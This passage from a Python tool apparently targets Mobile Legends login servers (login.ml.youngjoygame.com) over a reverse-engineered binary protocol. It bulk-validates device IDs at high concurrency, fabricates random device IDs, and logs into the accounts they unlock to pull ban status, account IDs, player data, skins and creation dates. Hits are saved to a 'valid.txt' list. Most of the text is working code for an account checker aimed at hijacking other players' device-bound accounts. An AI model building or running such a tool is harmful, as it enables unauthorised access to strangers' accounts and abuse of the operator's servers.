    except Exception:
        return False
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


async def _fast_valid_check_async(device_id: str, sem: asyncio.Semaphore, timeout: float = 4.0) -> bool:
    """Async wrapper — runs the sync check in a thread pool executor."""
    loop = asyncio.get_event_loop()
    async with sem:
        return await loop.run_in_executor(None, _fast_valid_check, device_id, timeout)


async def _run_valid_only_check(ids: List[str], concurrency: int, dashboard) -> None:
    """Fast bulk valid-only check using thread pool + async semaphore."""
    sem = asyncio.Semaphore(concurrency)
    
    async def worker(did):
        ok = await _fast_valid_check_async(did, sem)
        if ok:
            dashboard.add_valid(did)
            _append(os.path.join(RESULTS_DIR, 'valid.txt'), did)
        else:
            dashboard.add_invalid()
    
    tasks = [asyncio.create_task(worker(did)) for did in ids]
    await asyncio.gather(*tasks, return_exceptions=True)


class ValidOnlyDashboard:
    """Lightweight dashboard for the fast valid-only checker."""
    def __init__(self, total: int, concurrency: int):
        self.total = total
        self.concurrency = concurrency
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.start_time = time.monotonic()
        self._lock = threading.Lock()
        self._stop = False
        self._thread = None
        self._lines = 0

    def add_valid(self, did: str = None):
        with self._lock:
            self.checked += 1
            self.valid += 1

    def add_invalid(self):
        with self._lock:
            self.checked += 1
            self.invalid += 1

    def snapshot(self):
        with self._lock:
            return {
                'checked': self.checked,
                'valid': self.valid,
                'invalid': self.invalid,
                'elapsed': time.monotonic() - self.start_time,
            }

    def _build_lines(self):
        s = self.snapshot()
        elapsed = s['elapsed']
        speed = s['checked'] / elapsed if elapsed > 0 else 0
        progress = (s['checked'] / self.total * 100) if self.total > 0 else 0
        eta = (self.total - s['checked']) / speed if speed > 0 else 0
        bar_len = 20
        filled = int(progress / 100 * bar_len)
        bar = gradient_text('#' * filled, CYAN, PURPLE) + f"{c(GRAY)}{'.' * (bar_len - filled)}{W}"

        checked_str = f"{s['checked']:,}"
        total_str = f"{self.total:,}"
        valid_str = f"{s['valid']:,}"
        invalid_str = f"{s['invalid']:,}"

        lines = []
        lines.append(f' {gtop()}')
        lines.append(f" {gtitle(f'{c(WHITE)}{BD}FAST VALID-ONLY DASHBOARD{W}', A1, A2)}")
        lines.append(f' {gmid()}')
        lines.append(f" {grow(f'{c(GRAY)}Progress{W}  {bar} {c(WHITE)}{progress:.0f}%{W}', A1, A2)}")
        lines.append(f" {grow(f'{c(GRAY)}Checked{W}   {c(WHITE)}{checked_str}{W} / {c(WHITE)}{total_str}{W}', A1, A2)}")
        lines.append(f" {grow(f'{c(GRAY)}Speed{W}     {c(TEAL)}{speed:.1f} id/s{W}', A1, A2)}")
        lines.append(f" {grow(f'{c(GRAY)}Elapsed{W}   {c(WHITE)}{fmt_dur(elapsed)}{W}', A1, A2)}")
        lines.append(f" {grow(f'{c(GRAY)}ETA{W}       {c(WHITE)}{fmt_dur(eta)}{W}', A1, A2)}")
        lines.append(f' {gdash()}')
        lines.append(f" {grow(f'{c(GREEN)}Valid{W}      {c(WHITE)}{BD}{valid_str}{W}', H1, H2)}")
        lines.append(f" {grow(f'{c(RED)}Invalid{W}    {c(WHITE)}{invalid_str}{W}', H1, H2)}")
        lines.append(f' {gdash()}')
        lines.append(f" {grow(f'{c(GREEN)}>{W} {c(GRAY)}results/valid.txt{W}', V1, V2)}")
        lines.append(f' {gbot()}')
        return lines

    def render(self):
        lines = self._build_lines()
        self._lines = len(lines)
        for ln in lines:
            p(ln)

    def refresh(self):
        if self._lines > 0:
            sys.stdout.write(f'\x1b[{self._lines}A')
            sys.stdout.flush()
        self.render()

    def _loop(self):
        while not self._stop:
            time.sleep(1)
            if self._stop:
                break
            self.refresh()

    def start(self):
        self.render()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop = True
        if self._thread:
            self._thread.join(timeout=2)

    def render_summary(self):
        s = self.snapshot()
        elapsed = s['elapsed']
        speed = s['checked'] / elapsed if elapsed > 0 else 0
        valid_str = f"{s['valid']:,}"
        invalid_str = f"{s['invalid']:,}"
        checked_str = f"{s['checked']:,}"

        p('')
        p(f' {gtop(V1, V2)}')
        p(f" {gtitle(f'{c(WHITE)}{BD}VALID-ONLY SUMMARY{W}', V1, V2)}")
        p(f' {gmid(V1, V2)}')
        p(f" {grow(f'{c(GREEN)}Valid{W}      {c(WHITE)}{BD}{valid_str}{W}', V1, V2)}")
        p(f" {grow(f'{c(RED)}Invalid{W}    {c(WHITE)}{invalid_str}{W}', V1, V2)}")
        p(f' {gdash(V1, V2)}')
        p(f" {grow(f'{c(GRAY)}Total{W}      {c(WHITE)}{checked_str}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Time{W}       {c(WHITE)}{fmt_dur(elapsed)}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Speed{W}      {c(WHITE)}{speed:.1f} id/s{W}', V1, V2)}")
        p(f' {gdash(V1, V2)}')
        p(f" {grow(f'{c(GREEN)}>{W} {c(GRAY)}results/valid.txt{W}', V1, V2)}")
        p(f' {gbot(V1, V2)}')
        p('')


BANV2_CLIENT_VERSION = '2.2.16.1232.1'
BANV2_CHANNEL = 'and_usa'

BAN_REASONS = {
    "1": "Verbal Abuse / Inappropriate Avatar or Name",
    "2": "Toxic Behavior / In-Game Chat Violation",
    "3": "Intentional Feeding / AFK / Griefing",
    "7": "Illegal Diamond Top-up / Refund Fraud",
    "21": "Using Plug-in Apps to Compromise Competitive Fairness",
    "22": "Account Security Risk / Fraudulent Activity",
    "23": "Unauthorized Account Access",
    "88": "Device Hardware Ban (HWID)",
    "99": "Permanent System Security Violation"
}


class BanV2Connection:
    def __init__(self, device_id: str):
        self.host = 'login.ml.youngjoygame.com'
        self.port = 30021
        self.sequence = 1
        self.socket = None
        self.queue_data = b''
        self.device_id = device_id
        
        parts = device_id.split('_')
        device_info = parts[1] if len(parts) >= 2 else device_id
        if len(parts) >= 3 and len(device_info) < 32:
            device_info = device_info + "_" + parts[2]

        if len(device_info) >= 32:
            self.imei_md5 = device_info[:32]
            self.android_id = device_info[32:48] if len(device_info) >= 48 else ""
            self.advertising_id = device_info[48:] if len(device_info) > 48 else ""
        else:
            self.imei_md5 = device_id
            self.android_id = ""
            self.advertising_id = ""

        self.channel = BANV2_CHANNEL
        self.client_version = BANV2_CLIENT_VERSION
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_server_host = ''
        self.game_server_port = 0

    def _write_number(self, value: int) -> bytes:
        result = bytearray()
        while value >= 0x80:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    def _pack_header(self, tag: int, data_type: int) -> bytes:
        if tag < 15:
            return bytes([(data_type << 4) | tag])
        else:
            return bytes([(data_type << 4) | 15]) + self._write_number(tag)

    def _pack_value(self, tag: int, value: Any) -> bytes:
        result = b''
        if isinstance(value, bool):
            result += self._pack_header(tag, 0)
            result += self._write_number(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                result += self._pack_header(tag, 1)
                result += self._write_number(-value)
            else:
                result += self._pack_header(tag, 0)
                result += self._write_number(value)
        elif isinstance(value, float):
            result += self._pack_header(tag, 3)
            packed = struct.pack("<d", value)
            result += self._write_number(len(packed))
            result += packed
        elif isinstance(value, (str, bytes)):
            result += self._pack_header(tag, 4)
            encoded = value.encode('utf-8') if isinstance(value, str) else value
            result += self._write_number(len(encoded))
            result += encoded
        elif isinstance(value, list):
            result += self._pack_header(tag, 5)
            result += self._write_number(len(value))
            for item in value:
                result += self._pack_value(0, item)
        elif isinstance(value, dict):
            if isinstance(value, SDP):
                result += self._pack_header(tag, 7)
                for k, v in sorted(value.items()):
                    result += self._pack_value(k, v)
                result += bytes([8 << 4])
            else:
                result += self._pack_header(tag, 6)
                result += self._write_number(len(value))
                for k, v in sorted(value.items()):
                    result += self._pack_value(0, k)
                    result += self._pack_value(0, v)
        else:
            raise ValueError(f"Unsupported type: {type(value)}")
        return result

    def _build_packet(self, pkt_id: int, sdp_data: bytes) -> bytes:
        packet = SDP({
            0: pkt_id,
            1: self.sequence,
            5: sdp_data
        }).data
        buf = zstd.compress(packet)
        flags = (len(buf) + 4) | (16 << 24)
        return flags.to_bytes(4, 'big') + buf

    def _decode_response(self, data: bytes) -> Tuple[int, Optional[Any]]:
        try:
            flags = int.from_bytes(data[:4], 'big')
            size = flags & 0xFFFFFF
            compression_type = flags >> 24
            body = data[4:size]
            if compression_type == 1:
                body = zlib.decompress(body)
            elif compression_type == 16:
                body = zstd.decompress(body)
            elif compression_type in (2, 3, 18):
                cipher = AES.new(_AES_KEY, AES.MODE_CBC, iv=_AES_IV)
                body = cipher.decrypt(body[:-1] if len(body) % 16 != 0 else body)
                body = body.rstrip(b'\x00')
                if compression_type == 3:
                    body = zlib.decompress(body)
                elif compression_type == 18:
                    body = zstd.decompress(body)
            result = SDP(body)
            pkt_id = result.get(0)
            if pkt_id is None:
                return -1, None
            res = result.get(6) or result.get(5)
            if not res or not isinstance(res, bytes):
                return pkt_id, None
            return pkt_id, SDP(res)
        except Exception:
            return -1, None

    def connect(self, host: str = None, port: int = None, timeout: float = 5.0):
        if host:
            self.host = host
        if port:
            self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(timeout)
        self.socket.connect((self.host, self.port))

    def send_packet(self, pkt_id: int, sdp_data: dict):
        sdp = SDP(sdp_data)
        packet = self._build_packet(pkt_id, sdp.data)
        self.socket.send(packet)
        self.sequence += 1

    def recv_packet(self) -> Tuple[int, Optional[Any]]:
        try:
            while len(self.queue_data) < 4:
                data = self.socket.recv(4096)
                if not data:
                    return -1, None
                self.queue_data += data
            flags = int.from_bytes(self.queue_data[:4], 'big')
            size = flags & 0xFFFFFF
            while len(self.queue_data) < size:
                data = self.socket.recv(4096)
                if not data:
                    return -1, None
                self.queue_data += data
            packet_data = self.queue_data[:size]
            self.queue_data = self.queue_data[size:]
            return self._decode_response(packet_data)
        except socket.timeout:
            return -1, None
        except Exception:
            return -1, None

    def cleanup(self):
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
            self.socket = None
            self.sequence = 1


def inspect_ban_v2(sdp_data: Any) -> Tuple[bool, dict]:
    is_banned = False
    details = {}
    if sdp_data:
        def scan(obj):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if k == 'ban_reason':
                        code_str = str(v)
                        details['ban_code'] = code_str
                        details['reason'] = BAN_REASONS.get(code_str, f"Unknown Ban Code: {code_str}")
                    elif k in ('ban_status', 'ban_time') or (isinstance(k, str) and 'ban' in k.lower()):
                        details[str(k)] = v
                    if k == 'endtime_day':
                        details['endtime_day'] = v
                    if k == 'endtime_hour':
                        details['endtime_hour'] = v
                    if k == 'endtime_min':
                        details['endtime_min'] = v
                    if k == 'endtime_sec':
                        details['endtime_sec'] = v
                    if isinstance(v, (dict, list)):
                        scan(v)
            elif isinstance(obj, list):
                for item in obj:
                    scan(item)
        scan(dict(sdp_data))
    if 'endtime_day' in details and details['endtime_day'] is not None:
        is_banned = True
    return is_banned, details


def check_ban_v2(device_id: str) -> dict:
    conn = BanV2Connection(device_id)
    result = {"status": "UNKNOWN", "device_id": device_id, "account_id": None, "zone_id": None}
    try:
        conn.connect('login.ml.youngjoygame.com', 30021, timeout=5.0)
        conn.send_packet(1, {
            0: conn.device_id,
            1: f'gps_adid={conn.advertising_id}&android_id={conn.android_id}&device_unique_id={conn.imei_md5}',
            2: conn.client_version, 3: conn.channel, 4: 'en'
        })
        pkt_id, res = conn.recv_packet()
        banned, ban_info = inspect_ban_v2(res)
        if banned:
            result["status"] = "BANNED"
            result["ban_code"] = ban_info.get('ban_code', 'N/A')
            result["reason"] = ban_info.get('reason', 'Unknown ban reason')
            day = ban_info.get('endtime_day', '?')
            hour = ban_info.get('endtime_hour', '00')
            minute = ban_info.get('endtime_min', '00')
            sec = ban_info.get('endtime_sec', '00')
            result["duration"] = f"Day {day}, {hour}:{minute}:{sec}"
            return result
        if pkt_id == 2 and res:
            conn.account_id = res.get(0)
            conn.session_key = res.get(1)
            zone_data = res.get(2)
            if isinstance(zone_data, dict):
                conn.zone_id = zone_data.get(0, 0)
            elif isinstance(zone_data, list) and len(zone_data) > 0:
                if isinstance(zone_data[0], dict):
                    conn.zone_id = zone_data[0].get(0, 0)
                else:
                    conn.zone_id = zone_data[0]
            else:
                conn.zone_id = zone_data or 0
            result["account_id"] = conn.account_id
            result["zone_id"] = conn.zone_id
        else:
            result["error"] = "Login server connection failed"
            return result
        conn.send_packet(5, {0: conn.account_id, 1: conn.session_key, 2: conn.client_version, 5: conn.zone_id, 6: conn.channel})
        pkt_id, res = conn.recv_packet()
        banned, ban_info = inspect_ban_v2(res)
        if banned:
            result["status"] = "BANNED"
            result["ban_code"] = ban_info.get('ban_code', 'N/A')
            result["reason"] = ban_info.get('reason', 'Unknown ban reason')
            day = ban_info.get('endtime_day', '?')
            hour = ban_info.get('endtime_hour', '00')
            minute = ban_info.get('endtime_min', '00')
            sec = ban_info.get('endtime_sec', '00')
            result["duration"] = f"Day {day}, {hour}:{minute}:{sec}"
            return result
        if pkt_id == 6 and res:
            game_server = res.get(1)
            if game_server and ':' in str(game_server):
                conn.game_server_host, conn.game_server_port = str(game_server).split(':')
                conn.game_server_port = int(conn.game_server_port)
            else:
                result["error"] = "Failed to parse game server endpoint"
                return result
        else:
            result["error"] = "Failed to fetch game server endpoint"
            return result
        conn.cleanup()
        conn.connect(conn.game_server_host, conn.game_server_port, timeout=5.0)
        conn.send_packet(10001, {
            0: conn.account_id, 1: conn.session_key, 2: conn.zone_id,
            4: conn.client_version, 13: conn.channel, 15: conn.device_id
        })
        conn.send_packet(10101, {0: 0, 2: 2})
        role_requested = False
        while True:
            pkt_id, res = conn.recv_packet()
            banned, ban_info = inspect_ban_v2(res)
            if banned:
                result["status"] = "BANNED"
                result["ban_code"] = ban_info.get('ban_code', 'N/A')
                result["reason"] = ban_info.get('reason', 'Unknown ban reason')
                day = ban_info.get('endtime_day', '?')
                hour = ban_info.get('endtime_hour', '00')
                minute = ban_info.get('endtime_min', '00')
                sec = ban_info.get('endtime_sec', '00')
                result["duration"] = f"Day {day}, {hour}:{minute}:{sec}"
                return result
            if pkt_id == -1:
                result["error"] = "Connection timeout during role verification"
                return result
            elif pkt_id is None:
                result["error"] = "Connection closed by server during role verification"
                return result
            elif pkt_id == 10002 and not role_requested:
                conn.send_packet(10003, {
                    0: conn.account_id, 1: conn.session_key, 2: conn.zone_id,
                    3: conn.client_version, 4: conn.channel, 5: conn.device_id
                })
                role_requested = True
            elif pkt_id in (10004, 10008):
                result["status"] = "NOT BANNED"
                return result
    except socket.timeout:
        result["error"] = "Connection timeout"
    except socket.error as e:
        result["error"] = f"Socket error: {str(e)}"
    except Exception as e:
        result["error"] = f"Unexpected error: {str(e)}"
    finally:
        conn.cleanup()
    return result


async def check_ban_v2_async(device_id: str) -> dict:
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, check_ban_v2, device_id)

def _aes(d: bytes) -> bytes:
    ciph = AES.new(_AES_KEY, AES.MODE_CBC, iv=_AES_IV)
    return ciph.decrypt(d[:-1] if len(d) % 16 else d)


class _T(Enum):
    IP = 0
    IN = 1
    FL = 2
    DB = 3
    ST = 4
    LI = 5
    DI = 6
    SB = 7
    SE = 8


class SDP(dict):
    def __init__(self, src: Any = None):
        super().__init__()
        self._b = b''
        self._o = 0
        if isinstance(src, bytes):
            self._b = src
            self._unpack()
        elif src is not None:
            super().update(src)
            self._pack()

    def _pack(self):
        self._b = bytes([_T.SB.value << 4])
        for t, v in sorted(self.items()):
            self._pk(t, v)
        self._b += bytes([_T.SE.value << 4])

    def _vn(self, v: int) -> bytes:
        r = bytearray()
        while v >= 128:
            r.append(v & 127 | 128)
            v >>= 7
        r.append(v & 127)
        return bytes(r)

    def _hdr(self, t: int, dt: _T):
        self._b += bytes([dt.value << 4 | t]) if t < 15 else bytes([dt.value << 4 | 15]) + self._vn(t)

    def _pk(self, t: int, v: Any):
        if isinstance(v, bool):
            self._hdr(t, _T.IP)
            self._b += self._vn(1 if v else 0)
        elif isinstance(v, int):
            if v < 0:
                self._hdr(t, _T.IN)
                self._b += self._vn(-v)
            else:
                self._hdr(t, _T.IP)
                self._b += self._vn(v)
        elif isinstance(v, float):
            self._hdr(t, _T.DB)
            pkt = struct.pack('<d', v)
            self._b += self._vn(len(pkt)) + pkt
        elif isinstance(v, (str, bytes)):
            self._hdr(t, _T.ST)
            e = v.encode() if isinstance(v, str) else v
            self._b += self._vn(len(e)) + e
        elif isinstance(v, list):
            self._hdr(t, _T.LI)
            self._b += self._vn(len(v))
            for i in v:
                self._pk(0, i)
        elif isinstance(v, dict):
            if isinstance(v, SDP):
                self._hdr(t, _T.SB)
                for k, vv in sorted(v.items()):
                    self._pk(k, vv)
                self._b += bytes([_T.SE.value << 4])
            else:
                self._hdr(t, _T.DI)
                self._b += self._vn(len(v))
                for k, vv in sorted(v.items()):
                    self._pk(0, k)
                    self._pk(0, vv)

    @property
    def data(self) -> bytes:
        return self._b

    def _unpack(self):
        if not self._b:
            return
        if self._b[0] >> 4 == _T.SB.value:
            self._o = 1
        while self._o < len(self._b):
            t, v = self._up()
            if isinstance(v, _T) and v == _T.SE:
                break
            self[t] = v

    def _rn(self) -> int:
        n = 1
        val = self._b[self._o] & 127
        while self._b[self._o + n - 1] >= 128:
            val |= (self._b[self._o + n] & 127) << 7 * n
            n += 1
        self._o += n
        return val

    def _up(self) -> Tuple[int, Any]:
        if self._o >= len(self._b):
            return (0, None)
        h = self._b[self._o]
        t = h & 15
        dt = _T(h >> 4)
        self._o += 1
        if t == 15:
            t = self._rn()
        if dt == _T.IP:
            return (t, self._rn())
        if dt == _T.IN:
            return (t, -self._rn())
        if dt == _T.DB:
            return (t, struct.unpack('<d', self._rn().to_bytes(8, 'little'))[0])
        if dt == _T.ST:
            n = self._rn()
            try:
                vv = self._b[self._o:self._o + n].decode()
            except Exception:
                vv = self._b[self._o:self._o + n]
            self._o += n
            return (t, vv)
        if dt == _T.LI:
            n = self._rn()
            items = []
            for _ in range(n):
                _, i = self._up()
                items.append(i)
            return (t, items)
        if dt == _T.DI:
            n = self._rn()
            d = {}
            for _ in range(n):
                _, k = self._up()
                _, vv = self._up()
                d[k] = vv
            return (t, d)
        if dt == _T.SB:
            sub = {}
            while True:
                st, sv = self._up()
                if isinstance(sv, _T) and sv == _T.SE:
                    break
                sub[st] = sv
            return (t, SDP(sub))
        if dt == _T.SE:
            return (t, _T.SE)
        return (t, None)


def _frame(pid: int, seq: int, payload: bytes) -> bytes:
    pkt = SDP({0: pid, 1: seq, 5: payload}).data
    buf = zstd.compress(pkt)
    return (len(buf) + 4 | 16 << 24).to_bytes(4, 'big') + buf


def _decode(ct: int, d: bytes) -> bytes:
    if ct == 1:
        return zlib.decompress(d)
    if ct == 16:
        return zstd.decompress(d)
    if ct == 2:
        return _aes(d).rstrip(b'\x00')
    if ct == 3:
        return zlib.decompress(_aes(d).rstrip(b'\x00'))
    if ct == 18:
        return zstd.decompress(_aes(d).rstrip(b'\x00'))
    return d


def _gen() -> str:
    imei = ''.join((str(random.randint(0, 9)) for _ in range(15)))
    md5 = hashlib.md5(imei.encode()).hexdigest()
    aid = '%016x' % random.getrandbits(64)
    adv = str(uuid.UUID(int=random.getrandbits(128)))
    return f'and_{md5}{aid}{adv}'


def _login_frame(did: str) -> bytes:
    p = did.split('_')
    info = p[1] if len(p) >= 2 else did
    if len(p) >= 3 and len(info) < 32:
        info += '_' + p[2]
    md5 = info[:32] if len(info) >= 32 else info
    aid = info[32:48] if len(info) >= 48 else ''
    adv = info[48:] if len(info) > 48 else ''
    payload = SDP({0: did, 1: f'gps_adid={adv}&android_id={aid}&device_unique_id={md5}', 2: CLI_VER, 3: CHANNEL, 4: LANG}).data
    return _frame(1, 1, payload)


def _load_pool(path: str) -> List[str]:
    ids = []
    with open(path, encoding='utf-8', errors='ignore') as f:
        for line in f:
            did = line.strip()
            if did and (not did.lower().endswith('none')) and (len(did) >= 40):
                ids.append(did)
    return ids


class _Bucket:
    def __init__(self, rate: float):
        self._rate = rate
        self._tokens = rate
        self._last = time.monotonic()
        self._lock = asyncio.Lock()

    async def acquire(self):
        async with self._lock:
            now = time.monotonic()
            delta = now - self._last
            self._last = now
            self._tokens = min(self._rate, self._tokens + delta * self._rate)
            if self._tokens < 1:
                wait = (1 - self._tokens) / self._rate
                await asyncio.sleep(wait)
                self._tokens = 0
            else:
                self._tokens -= 1


async def _read_n(r: asyncio.StreamReader, n: int) -> bytes:
    buf = b''
    while len(buf) < n:
        c = await r.read(n - len(buf))
        if not c:
            raise EOFError
        buf += c
    return buf


async def _get_game_server(acc, skey, zone, writer_login, reader_login) -> Optional[Tuple[str, int]]:
    try:
        payload = SDP({0: acc, 1: skey, 2: CLI_VER, 5: zone, 6: CHANNEL}).data
        writer_login.write(_frame(5, 2, payload))
        await asyncio.wait_for(writer_login.drain(), timeout=1.0)
        hdr = await asyncio.wait_for(_read_n(reader_login, 4), timeout=READ_TO)
        flags = int.from_bytes(hdr, 'big')
        size = flags & 16777215
        ct = flags >> 24
        body = await asyncio.wait_for(_read_n(reader_login, size - 4), timeout=READ_TO)
        body = _decode(ct, body)
        outer = SDP(body)
        if outer.get(0) != 6:
            return None
        raw = outer.get(6) or outer.get(5)
        if not isinstance(raw, bytes):
            return None
        inner = SDP(raw)
        addr = inner.get(1)
        if not addr or ':' not in str(addr):
            return None
        host, port = str(addr).split(':', 1)
        return host, int(port)
    except Exception:
        return None


async def _get_player_info(acc, skey, zone, did, gs_host, gs_port) -> Optional[Tuple[SDP, Optional[SDP]]]:
    writer = None
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(gs_host, gs_port), timeout=CONN_TO)
        writer = w
        auth_payload = SDP({0: acc, 1: skey, 2: zone, 4: CLI_VER, 13: CHANNEL, 15: did}).data
        w.write(_frame(10001, 1, auth_payload))
        w.write(_frame(10101, 2, SDP({0: 0, 2: 2}).data))
        await asyncio.wait_for(w.drain(), timeout=1.0)
        authed = False
        for _ in range(30):
            try:
                hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
                flags = int.from_bytes(hdr, 'big')
                size = flags & 16777215
                ct = flags >> 24
                body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
                body = _decode(ct, body)
                outer = SDP(body)
                pid = outer.get(0)
                if pid == 10002:
                    authed = True
                    break
                elif pid == 20001:
                    continue
                else:
                    break
            except Exception:
                break
        if not authed:
            return None, None
        
        info_payload = SDP({1: int(acc)}).data
        w.write(_frame(11153, 3, info_payload))
        await asyncio.wait_for(w.drain(), timeout=1.0)
        
        player_data = None
        role_id = acc
        zone_id = zone
        for _ in range(10):
            try:
                hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
                flags = int.from_bytes(hdr, 'big')
                size = flags & 16777215
                ct = flags >> 24
                body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
                body = _decode(ct, body)
                outer = SDP(body)
                pid = outer.get(0)
                if pid == 11154:
                    raw = outer.get(6) or outer.get(5)
                    if isinstance(raw, bytes):
                        player_data = SDP(raw)
                        try:
                            pl = player_data.get(0)
                            if isinstance(pl, list) and len(pl) > 0:
                                pd_inner = pl[0]
                                if isinstance(pd_inner, (dict, SDP)):
                                    role_id = pd_inner.get(0, acc)
                                    zone_id = pd_inner.get(1, zone)
                        except Exception:
                            pass
                    break
                elif pid == 20001:
                    continue
                else:
                    continue
            except Exception:
                break
        
        if not player_data:
            return None, None
        
        role_info = None
        try:
            skin_payload = SDP({0: int(role_id), 1: int(zone_id)}).data
            w.write(_frame(10143, 4, skin_payload))
            await asyncio.wait_for(w.drain(), timeout=1.0)
            for _ in range(15):
                try:
                    hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
                    flags = int.from_bytes(hdr, 'big')
                    size = flags & 16777215
                    ct = flags >> 24
                    body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
                    body = _decode(ct, body)
                    outer = SDP(body)
                    pid = outer.get(0)
                    if pid == 10144:
                        raw = outer.get(6) or outer.get(5)
                        if isinstance(raw, bytes):
                            role_info = SDP(raw)
                        break
                    elif pid == 20001:
                        continue
                    else:
                        continue
                except Exception:
                    break
        except Exception:
            pass
        
        return player_data, role_info
    except Exception:
        return None, None
    finally:
        if writer:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

async def _fetch_creation_date_only(did: str) -> Optional[dict]:
    writer = None
    try:
        frame = _login_frame(did)
        r, w = await asyncio.wait_for(asyncio.open_connection(LOGIN_HOST, LOGIN_PORT), timeout=CONN_TO)
        writer = w
        w.write(frame)
        await asyncio.wait_for(w.drain(), timeout=1.0)
        hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
        flags = int.from_bytes(hdr, 'big')
        size = flags & 16777215
        ct = flags >> 24
        body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
        body = _decode(ct, body)
        outer = SDP(body)
        if outer.get(0) != 2:
            return None
        raw = outer.get(6) or outer.get(5)
        if not isinstance(raw, bytes):
            return None
        inner = SDP(raw)
        acc = inner.get(0)
        if not acc:
            return None
        
        creation_ts = int(inner.get(19, 0) or 0)
        
        zr = inner.get(2)
        if isinstance(zr, list):
            zones = [z for z in zr if isinstance(z, int)] if zr else [0]
        elif isinstance(zr, dict):
            zones = [zr.get(0, 0)]
        elif isinstance(zr, int):
            zones = [zr]
        else:
            zones = [0]
        zone = zones[0] if zones else 0
        
        return {
            'did': did,
            'acc': acc,
            'zone': zone,
            'creation_ts': creation_ts,
        }
    except Exception:
        return None
    finally:
        if writer:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass


def run_creation_date_single():
    clear()
    print_banner()
    
    p(f' {gtop()}')
    p(f" {gtitle(f'{c(WHITE)}{BD}CHECK CREATION DATE ONLY{W}')}")
    p(f' {gmid()}')
    p(f" {grow(f'{c(GRAY)}Lightweight check - only fetches account creation date.{W}')}")
    p(f" {grow(f'{c(GRAY)}No game server connection needed. Very fast.{W}')}")
    p(f' {gbot()}')
    p('')
    
    p(f' {gtop()}')
    p(f" {grow(f'{c(GRAY)}Enter a single Device ID to check.{W}')}")
    p(f' {gbot()}')
    p('')
    
    device_id = input(f' {c(CYAN)}Device ID (0 = Back)>{W} ').strip()
    if not device_id or device_id in ('0', 'q', 'exit', 'back'):
        return
    
    p(f'\n {c(GRAY)}[*] Fetching creation date...{W}\n')
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            result = loop.run_until_complete(_fetch_creation_date_only(device_id))
        finally:
            loop.close()
    except Exception as e:
        p(f' {c(RED)}Error: {e}{W}')
        input(f'\n {c(CYAN)}Press Enter to continue...{W}')
        return
    
    if not result:
        p(f' {c(RED)}Login failed! Device ID invalid or dead.{W}')
        input(f'\n {c(CYAN)}Press Enter to continue...{W}')
        return
    
    acc = result.get('acc')
    zone = result.get('zone')
    ts = result.get('creation_ts', 0)
    
    p(f' {c(GREEN)}Login successful!{W}\n')
    
    if ts and ts >= _MIN_VALID_TS:
        date_str = fmt_timestamp_full(ts)
        age_str = fmt_age(ts)
        age_days = max(0, int(time.time()) - ts) // 86400
        if age_days >= 365 * 3:
            cat_color = GOLD
            cat_text = "OLD ACCOUNT (3+ years)"
        elif age_days >= 365:
            cat_color = GREEN
            cat_text = "ESTABLISHED (1-3 years)"
        elif age_days >= 90:
            cat_color = TEAL
            cat_text = "MODERATE (3-12 months)"
        else:
            cat_color = CORAL
            cat_text = "RECENT (less than 3 months)"
    else:
        date_str = "N/A"
        age_str = "N/A"
        age_days = 0
        cat_color = GRAY
        cat_text = "UNKNOWN"
    
    acc_str = str(acc)
    zone_str = str(zone)
    ts_str = str(ts)
    age_days_str = f"{age_days:,}"
    
    p(f' {gtop(V1, V2)}')
    p(f" {gtitle(f'{c(WHITE)}{BD}CREATION DATE RESULT{W}', V1, V2)}")
    p(f' {gmid(V1, V2)}')
    p(f" {grow(f'{c(GRAY)}Device ID{W}     {c(GOLD)}{device_id}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Account{W}       {c(WHITE)}{acc_str}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Zone{W}          {c(WHITE)}{zone_str}{W}', V1, V2)}")
    p(f' {gdash(V1, V2)}')
    p(f" {grow(f'{c(GRAY)}Created{W}       {c(GOLD)}{date_str}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Age{W}           {c(GOLD)}{age_str}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Age (days){W}    {c(GOLD)}{age_days_str}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Category{W}      {c(cat_color)}{cat_text}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Raw Timestamp{W} {c(WHITE)}{ts_str}{W}', V1, V2)}")
    p(f' {gbot(V1, V2)}')
    p('')
    
    os.makedirs(RESULTS_DIR, exist_ok=True)
    out_file = os.path.join(RESULTS_DIR, 'creation_dates_single.txt')
    line = f"DevID: {device_id} | Account: {acc_str} | Zone: {zone_str} | Created: {date_str} | Age: {age_str} | AgeDays: {age_days} | TS: {ts_str}"
    try:
        with open(out_file, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
        p(f' {c(GREEN)}Saved to:{W} {c(GRAY)}{out_file}{W}')
    except Exception:
        pass
    
    p('')
    input(f' {c(CYAN)}Press Enter to continue...{W}')

def run_ban_check_single():
    clear()
    print_banner()
    
    p(f' {gtop()}')
